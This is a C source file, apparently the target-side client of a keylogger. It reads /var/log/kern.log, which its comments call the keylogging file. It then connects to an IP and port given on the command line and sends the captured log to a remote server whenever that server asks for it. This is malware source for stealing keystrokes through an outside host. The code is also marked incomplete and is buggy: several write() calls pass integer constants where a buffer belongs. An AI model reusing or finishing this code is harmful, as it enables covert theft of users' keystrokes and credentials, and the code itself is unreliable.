#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <sys/time.h>

#define BUF_SIZE 256

//server -> client(target)
#define GET_LOG_REQUEST 100
#define EXIT_PROC_REQUEST 900

//client(target) -> server
#define SEND_LOG_RESPONSE 101
#define SEND_ERR_RESPONSE 102
#define EXIT_PROC_RESPONSE 901


void sendLog(char* str, int sendSize, char* servIP, char* port);
void errorHandling(char *message);




int main(int argc, char* argv[])
{
	struct stat file_info;
	FILE *fp;
	char *str;
	int fileSize;
	char buf[BUF_SIZE];
	int sendSize;


	if( argc != 3){
		printf("Usage : %s <IP> <PORT> \n",argv[0]);
		exit(1);
	}

	// get file size of /var/log/kern.log
	stat( "/var/log/kern.log", &file_info);
	fileSize = file_info.st_size;
	
	// open keylogging file
	if (NULL == (fp = fopen( "/var/log/kern.log", "r")))
		errorHandling("log file open error");
	

	// get message(str) for send
	str = malloc(fileSize+1024);
	memset(str, '\0', fileSize+1024);
	printf("malloc success\n");

	memset(buf, '\0', BUF_SIZE);
	while(fgets(buf, BUF_SIZE, fp)){
		strcat(str,buf);
		memset(buf, '\0', BUF_SIZE);
	}

	// get message's size
	sendSize = strlen(str)+1;

	// if fileSize = 0  then SEND_ERR_RESPONSE to server
	if(fileSize == 0)
		sendSize = 0;

	// test : print keylog message, size
	puts(str);
	printf("%d", sendSize);
	printf("\n\n\nfile size is = %d\n", fileSize);



	// send message to server
	sendLog(str, sendSize, argv[1], argv[2]);


			
	fclose(fp);
	free(str);
	


	return 0;
}

void errorHandling(char* message){
	fputs(message, stderr);
	fputc('\n', stderr);
	exit(1);
}



void sendLog(char* str, int sendSize, char* servIP, char* port){
	int sock;
	struct sockaddr_in servAddr;
	char option = 0;

	sock = socket(PF_INET, SOCK_STREAM, 0);
	if( sock == -1)
		errorHandling("socket() error");

	memset(&servAddr, 0, sizeof(servAddr));
	servAddr.sin_family = AF_INET;
	servAddr.sin_addr.s_addr = inet_addr(servIP);
	servAddr.sin_port = htons(atoi(port));

	if( connect(sock, (struct sockaddr*)&servAddr, sizeof(servAddr)) == -1 )
		errorHandling("connect() error");

	// non complete
	while(1){

		read(sock, &option, 1);

		switch (option){
			case GET_LOG_REQUEST :
				printf("case1\n");
				if(sendSize == 0)	// send to client 'SEND_ERR_RESPONSE'
					write(sock, SEND_ERR_RESPONSE, 1);
				else{
					// send to client 'SEND_LOG_RESPONSE'	
					write(sock, SEND_LOG_RESPONSE, 1);
					write(sock, str, strlen(str));
				}
				break;
/*
			case '2' :
				printf("case2\n");
				// something else~~
				break;
*/

			case EXIT_PROC_REQUEST :
				printf("exit keylogging\n"); 
				break;

			default :
				break;

		}
	}

}